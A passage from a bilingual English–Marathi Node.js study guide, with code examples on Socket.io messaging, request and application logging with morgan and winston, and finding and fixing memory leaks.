    socket.on('privateMsg', (data, ack) => {
        io.to(data.toSocketId).emit('privateMsg', data.text);
        ack({ status: 'delivered' });
    });

    socket.on('disconnect', (reason) => console.log('User left:', socket.id, reason));
});

server.listen(3000, () => console.log('Chat server on :3000'));   // NOT app.listen
Code Example: Browser Client
// npm install socket.io-client   (or the <script> served by the server)
import { io } from 'socket.io-client';
const socket = io('http://localhost:3000');

socket.on('connect', () => console.log('Connected as', socket.id));
socket.emit('chat', 'Hello everyone!');                    // send
socket.on('chat', ({ from, msg }) => console.log(from, msg)); // receive
socket.emit('joinRoom', 'room-5');
socket.emit('privateMsg', { toSocketId: 'abc', text: 'Hi' }, (res) => console.log(res.status));
Emit Cheat-Sheet (Server):
  • socket.emit(event, data) → only this client.
  • io.emit(event, data) → all connected clients.
  • socket.broadcast.emit(event, data) → everyone except the sender.
  • io.to(room).emit(...) → everyone in a room (or one socket by its id).
  • socket.to(room).emit(...) → everyone in the room except the sender.
  • socket.join(room) / socket.leave(room) → enter / leave a room.
  • Built-in events: 'connection' (server), 'connect' / 'disconnect' (both sides).
  • Scaling: with several servers / PM2 cluster, use the Redis adapter (@socket.io/redis-adapter) and sticky sessions so broadcasts reach everyone.
  • Auth: send a token on connect (io(url, { auth: { token } })) and verify it in io.use((socket, next) => ...) middleware.
मराठी सारांश (WebSockets आणि Socket.io):
  • HTTP: client विचारतो, server उत्तर देतो, संपले. Server स्वतःहून data पाठवू शकत नाही.
  • WebSocket: एकच connection उघडे राहते. Client आणि server दोघेही कधीही message पाठवू शकतात (real-time, full-duplex). ws:// / wss://.
  • उपयोग: chat, live notifications, games, live score, delivery tracking.
  • Socket.io: WebSocket वर बनलेली library. Events (emit / on), आपोआप reconnect, fallback, rooms, broadcast, acknowledgements देते.
  • Setup: http.createServer(app) → new Server(server) → io.on('connection', socket => ...) → server.listen() (app.listen नाही).
  • Emit: socket.emit = फक्त हा client. io.emit = सगळे. socket.broadcast.emit = पाठवणारा सोडून सगळे. io.to(room) = room मधले.
  • Rooms: socket.join('room-5'). Group chat साठी.
  • अनेक servers असल्यास Redis adapter लागतो. Connect करताना token ने auth करा.
  • उदाहरण: HTTP = पत्र पाठवणे (पाठवा, उत्तराची वाट, संपले). WebSocket = phone call (एकदा जोडले की दोघेही कधीही बोलू शकतात).

Chapter 33: Logging in Node.js (morgan, winston)

Q. What is Logging and Why is it Needed?

Concept:
  • Logging means recording what happens in your app (requests, errors, important actions) so you can debug, monitor and audit it later.
  • In production you can't attach a debugger or watch the console; logs are often the only way to find out what went wrong.
  • console.log is fine for learning, but for production you need levels, timestamps, structured JSON, files and rotation.
  • Simple example: a ship's logbook. Every event is written with the time, so after a problem you can see exactly what happened.
Log Levels (most to least severe):
  • error: something failed (exceptions, DB down).
  • warn: unexpected but handled (deprecated API, retrying).
  • info: normal important events (server started, user registered).
  • http: request logs.
  • debug: detailed info for developers (turn off in production).
  • Set a minimum level: e.g. info in production (debug is hidden), debug in development.

Q. What is morgan? (HTTP Request Logger)

Concept:
  • morgan is an Express middleware that logs every HTTP request automatically: method, URL, status code, response time, size.
  • It answers "what requests are hitting my server, and how fast?"
Code Example: morgan
// npm install morgan
const morgan = require('morgan');

app.use(morgan('dev'));        // development: colored, short
// Output:  GET /api/users 200 12.345 ms - 532

app.use(morgan('combined'));   // production: Apache-style full line (IP, date, user-agent)
// ::1 - - [10/Oct/2026:13:55:36 +0000] "GET /api/users HTTP/1.1" 200 532 "-" "Mozilla/5.0..."

// Custom format
app.use(morgan(':method :url :status :response-time ms'));
  • Syntax: morgan(format, options)
  • format: A preset ('dev', 'combined', 'common', 'short', 'tiny') or a custom string using tokens (:method, :url, :status, :response-time).
  • options.stream: Where to write (default process.stdout); can be a file or winston.
  • options.skip: Function to skip some logs, e.g. skip: (req, res) => res.statusCode < 400 (log only errors).

Q. What is winston? (Application Logger)

Concept:
  • winston is a full-featured logging library for application logs: your own messages and errors, with levels, formats (JSON, timestamps) and transports (console, files, external services).
  • morgan vs winston: morgan logs HTTP requests; winston logs everything else. They are often used together (morgan writes into winston).
  • pino is a faster alternative, popular for high-traffic apps.
Code Example: winston Logger (logger.js)
// npm install winston
const winston = require('winston');

const logger = winston.createLogger({
    level: process.env.NODE_ENV === 'production' ? 'info' : 'debug',
    format: winston.format.combine(
        winston.format.timestamp(),
        winston.format.errors({ stack: true }),   // include stack traces
        winston.format.json()                     // structured, easy to search
    ),
    transports: [
        new winston.transports.File({ filename: 'logs/error.log', level: 'error' }),
        new winston.transports.File({ filename: 'logs/combined.log' })
    ]
});

if (process.env.NODE_ENV !== 'production') {
    logger.add(new winston.transports.Console({ format: winston.format.simple() }));
}

module.exports = logger;

// usage
logger.info('Server started', { port: 3000 });
logger.warn('Slow query', { ms: 1200, query: 'findUsers' });
logger.error('Payment failed', { orderId: 55, err });

// send morgan's request logs into winston
app.use(morgan('combined', { stream: { write: (msg) => logger.http(msg.trim()) } }));
Logging Best Practices:
  • Use structured (JSON) logs with context: request id, user id, route, duration.
  • Never log secrets: passwords, tokens, full card numbers, OTPs.
  • Use the right level; don't log everything as error.
  • Rotate log files (winston-daily-rotate-file) so the disk doesn't fill up.
  • In production, send logs to a central system (ELK, Grafana Loki, Datadog, CloudWatch) for searching and alerts.
  • Log errors once, in the global error handler, with the stack trace.
मराठी सारांश (Logging):
  • Logging म्हणजे app मध्ये काय घडले (requests, errors, महत्वाच्या घटना) याची वेळेसह नोंद. Debug, monitoring आणि audit साठी.
  • Production मध्ये debugger लावता येत नाही, तिथे logs हाच मुख्य आधार असतो.
  • Levels: error (अपयश) > warn (इशारा) > info (महत्वाच्या घटना) > http (requests) > debug (developer माहिती). Production मध्ये info पासून वर.
  • morgan: प्रत्येक HTTP request आपोआप log करतो (method, URL, status, वेळ). 'dev' development साठी, 'combined' production साठी.
  • winston: app चे स्वतःचे logs. Levels, timestamp, JSON format, files (error.log, combined.log). Morgan चे logs पण winston मध्ये पाठवता येतात.
  • नियम: passwords / tokens कधीही log करू नका. JSON logs + context (user id, route). Files rotate करा. Production मध्ये central system (ELK, Datadog).
  • उदाहरण: जहाजाचे logbook. प्रत्येक घटना वेळेसह लिहिली जाते, अडचण आल्यावर नेमके काय झाले ते कळते.

Chapter 34: Memory Leaks in Node.js

Q. What is a Memory Leak?

Concept:
  • A memory leak happens when your app keeps holding memory it no longer needs, so the garbage collector (GC) can't free it.
  • V8's GC frees objects that are no longer reachable. A leak means something (a global array, cache, listener, timer, closure) still holds a reference to the unneeded objects.
  • Symptoms: memory (heapUsed / RSS) keeps growing over hours/days and never comes back down, the app gets slower (GC working harder), then crashes with JavaScript heap out of memory.
  • Long-running servers are especially affected, because small leaks per request add up over millions of requests.
  • Simple example: a tap left slightly open. Each drop is tiny, but overnight the bucket overflows.
Diagram: Normal Memory vs Memory Leak

Q. Common Causes of Memory Leaks (with Fixes)

  • 1. Global variables / growing arrays: data pushed into a module-level array or object on every request and never removed.
  • 2. Unbounded caches: a Map used as a cache with no size limit or expiry.
  • 3. Event listeners never removed: adding .on() on every request to a long-lived emitter. (Node warns: MaxListenersExceededWarning.)
  • 4. Timers never cleared: setInterval that keeps references alive forever.
  • 5. Closures holding big objects: a long-lived function that captures a large variable it doesn't need.
  • 6. Unclosed resources: DB connections, file streams, sockets left open.
  • 7. Storing per-user data in server memory (e.g. sessions in the default MemoryStore).
Code Example: ❌ Leaks and ✅ Fixes
// 1. ❌ Global array grows forever
const requestLog = [];
app.use((req, res, next) => { requestLog.push({ url: req.url, at: Date.now() }); next(); });
// ✅ Use a logger (Chapter 33), or keep only the last N items
if (requestLog.length > 1000) requestLog.shift();

// 2. ❌ Cache with no limit
const cache = new Map();
function getUser(id) { if (!cache.has(id)) cache.set(id, loadUser(id)); return cache.get(id); }
// ✅ Use an LRU cache with max size + TTL (npm install lru-cache)
const { LRUCache } = require('lru-cache');
const safeCache = new LRUCache({ max: 500, ttl: 1000 * 60 * 5 });  // 500 items, 5 min

// 3. ❌ Listener added on every request (never removed)
app.get('/stream', (req, res) => {
    bus.on('update', (d) => res.write(d));                    // piles up forever
});
// ✅ Remove it when the client leaves
app.get('/stream', (req, res) => {
    const onUpdate = (d) => res.write(d);
    bus.on('update', onUpdate);
    req.on('close', () => bus.off('update', onUpdate));
});

// 4. ❌ Interval never cleared
setInterval(() => refreshPrices(bigConfig), 1000);
// ✅ Keep the id and clear it when done / on shutdown
const timer = setInterval(() => refreshPrices(), 1000);
process.on('SIGTERM', () => clearInterval(timer));

Q. How to Detect and Debug Memory Leaks?

  1. Monitor memory: log process.memoryUsage().heapUsed regularly, or watch pm2 monit / your monitoring dashboard. A leak looks like a line that only goes up.
  2. Reproduce under load: hit the suspicious endpoint many times (e.g. with autocannon or k6) and watch memory.
  3. Take heap snapshots: run node --inspect app.js, open chrome://inspect → Memory tab → take snapshot A, run load, take snapshot B.
  4. Compare snapshots: use the "Comparison" view to see which object types grew (e.g. thousands of Closure or Array objects), then follow the Retainers path to the code holding them.
  5. Fix and verify: remove the reference (clear, off(), limit the cache), then repeat the test; memory should go up and down.
Code Example: Simple Memory Monitor and Useful Flags
// Log memory every 30s (MB)
setInterval(() => {
    const m = process.memoryUsage();
    const mb = (b) => (b / 1024 / 1024).toFixed(1) + ' MB';
    console.log(`heapUsed=${mb(m.heapUsed)} heapTotal=${mb(m.heapTotal)} rss=${mb(m.rss)}`);
}, 30000).unref();   // unref: don't keep the process alive just for this timer

// Useful commands
// node --inspect app.js                          → debug + heap snapshots in Chrome DevTools
// node --max-old-space-size=2048 app.js          → raise heap limit to 2 GB (hides, doesn't fix, a leak)
// node --heapsnapshot-near-heap-limit=2 app.js   → auto-save snapshots before an OOM crash
// pm2 start app.js --max-memory-restart 500M     → safety net: restart if memory > 500 MB
  • WeakMap / WeakRef: to attach data to objects without stopping GC from freeing them, use a WeakMap (its keys don't keep objects alive).
  • Restarting with PM2 is a safety net, not a fix. Find and remove the leaking reference.
मराठी सारांश (Memory Leaks):
  • Memory leak म्हणजे गरज नसलेली memory app अजूनही धरून ठेवतो, म्हणून garbage collector ती मोकळी करू शकत नाही.
  • लक्षणे: memory तासन्तास फक्त वाढत राहते, app slow होतो, शेवटी heap out of memory crash.
  • कारणे: (1) global array मध्ये सतत भर, (2) मर्यादा नसलेला cache, (3) प्रत्येक request ला .on() listener पण कधीच off() नाही, (4) clearInterval न केलेले timers, (5) मोठा data धरून ठेवणारे closures, (6) उघडी राहिलेली DB / file connections, (7) server memory मध्ये sessions.
  • उपाय: LRU cache (max + TTL), listeners काढा (req.on('close') मध्ये off), timers clear करा, connections बंद करा, sessions Redis मध्ये.
  • शोधणे: process.memoryUsage() लक्ष ठेवा → load test → node --inspect ने Chrome DevTools मध्ये दोन heap snapshots → compare करून कोणते objects वाढले आणि त्यांना कोण धरून आहे (Retainers) ते शोधा.
  • PM2 --max-memory-restart हा फक्त तात्पुरता उपाय आहे. खरी leak शोधून fix करा.
  • उदाहरण: थोडासा उघडा राहिलेला नळ. प्रत्येक थेंब छोटा, पण रात्रभरात बादली भरून वाहते.
